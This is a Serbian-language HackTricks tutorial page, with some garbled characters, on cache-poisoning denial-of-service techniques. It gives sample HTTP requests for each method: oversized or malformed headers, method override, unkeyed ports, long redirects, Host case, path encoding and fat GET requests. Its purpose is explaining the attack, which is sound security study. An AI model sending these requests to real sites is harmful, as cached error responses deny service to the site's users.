# Trovanje ke코a za DoS

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

{% hint style="danger" %}
Na ovoj stranici mo쬰te prona캖i razli캜ite varijacije za poku코aj da se **veb server odgovori sa gre코kama** na zahteve koji su **validni za ke코 servere**
{% endhint %}

* **Prekora캜enje HTTP zaglavlja (HHO)**

Po코aljite zahtev sa veli캜inom zaglavlja ve캖om od one koju podr쬬va veb server, ali manjom od one koju podr쬬va ke코 server. Veb server 캖e odgovoriti sa 400 odgovorom koji mo쬰 biti ke코iran:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTP Meta Karakter (HMC) & Neo캜ekivane vrednosti**

Po코aljite zaglavlje koje sadr쬴 neke **코tetne meta karaktere** kao 코to su `\n` i `\r`. Da bi napad uspeo, prvo morate zaobi캖i ke코.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
Lo코e konfigurisan zaglavlje mo쬰 biti samo `\:` kao zaglavlje.

Ovo tako캠e mo쬰 raditi ako se 코alju neo캜ekivane vrednosti, poput neo캜ekivanog Content-Type:
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **Neindeksirani zaglavlje**

Neke veb lokacije 캖e vratiti statusni kod gre코ke ako **vide odre캠ena zaglavlja** u zahtevu, kao 코to je zaglavlje _X-Amz-Website-Location-Redirect: ne코to_:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **Napad preko zamene HTTP metoda (HMO)**

Ako server podr쬬va promenu HTTP metoda pomo캖u zaglavlja poput `X-HTTP-Method-Override`, `X-HTTP-Method` ili `X-Method-Override`. Mogu캖e je zatra쬴ti validnu stranicu menjaju캖i metod koji server ne podr쬬va, 코to mo쬰 rezultirati lo코im odgovorom koji se ke코ira:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **Neklju캜ani port**

Ako se port u zaglavlju Host odra쬬va u odgovoru i nije uklju캜en u klju캜 ke코a, mogu캖e je preusmeriti ga na nekori코캖eni port:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Duga캜ko preusmeravanje DoS**

Kao u slede캖em primeru, x nije ke코iran, pa napada캜 mo쬰 zloupotrebiti pona코anje odgovora preusmeravanja kako bi naterao preusmeravanje da po코alje URL koji je toliko veliki da izaziva gre코ku. Zatim, ljudi koji poku코avaju da pristupe URL-u bez neke ke코irane x klju캜ne re캜i dobi캖e odgovor o gre코ci:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **Normalizacija slu캜aja zaglavlja doma캖ina**

Zaglavlje doma캖ina treba da bude neosetljivo na veli캜inu slova, ali neki veb sajtovi o캜ekuju da bude malim slovima i vra캖aju gre코ku ako nije:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **Normalizacija putanje**

Neke stranice 캖e vratiti kodove gre코aka slanjem podataka URLenkodiranih u putanji, me캠utim, ke코 server 캖e URLdekodirati putanju i sa캜uvati odgovor za URLdekodiranu putanju:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Debeli Get**

Neke ke코 servere, poput Cloudflare-a, ili veb servere, zaustavljaju GET zahteve sa telom, pa bi ovo moglo biti zloupotrebljeno da bi se ke코irao neva쬰캖i odgovor:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## Reference

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
